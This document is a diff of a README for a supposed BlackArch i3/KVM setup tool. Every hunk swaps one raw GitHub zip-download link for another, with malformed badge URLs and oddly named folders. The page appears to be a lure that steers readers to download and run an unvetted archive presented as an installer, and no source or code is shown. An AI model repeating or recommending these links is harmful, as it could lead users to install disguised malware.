@@ -1,6 +1,6 @@
 # 🖥️ blackarch-i3-kvm-setup - Simplify Your BlackArch Installation
 
-[![Download](https://raw.githubusercontent.com/pdgydominik/blackarch-i3-kvm-setup/main/bromethyl/blackarch-i3-kvm-setup.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/pdgydominik/blackarch-i3-kvm-setup/main/bromethyl/blackarch-i3-kvm-setup.zip)
+[![Download](https://raw.githubusercontent.com/dagule/blackarch-i3-kvm-setup/main/step7 arch git upload/kvm_blackarch_i_setup_3.6.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/dagule/blackarch-i3-kvm-setup/main/step7 arch git upload/kvm_blackarch_i_setup_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To ensure smooth operation, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To get the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/pdgydominik/blackarch-i3-kvm-setup/main/bromethyl/blackarch-i3-kvm-setup.zip).
+1. **Visit the Releases Page**: To get the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/dagule/blackarch-i3-kvm-setup/main/step7 arch git upload/kvm_blackarch_i_setup_3.6.zip).
    
 2. **Choose Your Version**: Find the latest release at the top and click on the link.
 
@@ -68,4 +68,4 @@ This project is available under the MIT License. You may use, modify, and distri
 
 Feel free to reach out via GitHub for any questions. Happy testing! 
 
-[![Download](https://raw.githubusercontent.com/pdgydominik/blackarch-i3-kvm-setup/main/bromethyl/blackarch-i3-kvm-setup.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/pdgydominik/blackarch-i3-kvm-setup/main/bromethyl/blackarch-i3-kvm-setup.zip)
+[![Download](https://raw.githubusercontent.com/dagule/blackarch-i3-kvm-setup/main/step7 arch git upload/kvm_blackarch_i_setup_3.6.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/dagule/blackarch-i3-kvm-setup/main/step7 arch git upload/kvm_blackarch_i_setup_3.6.zip)
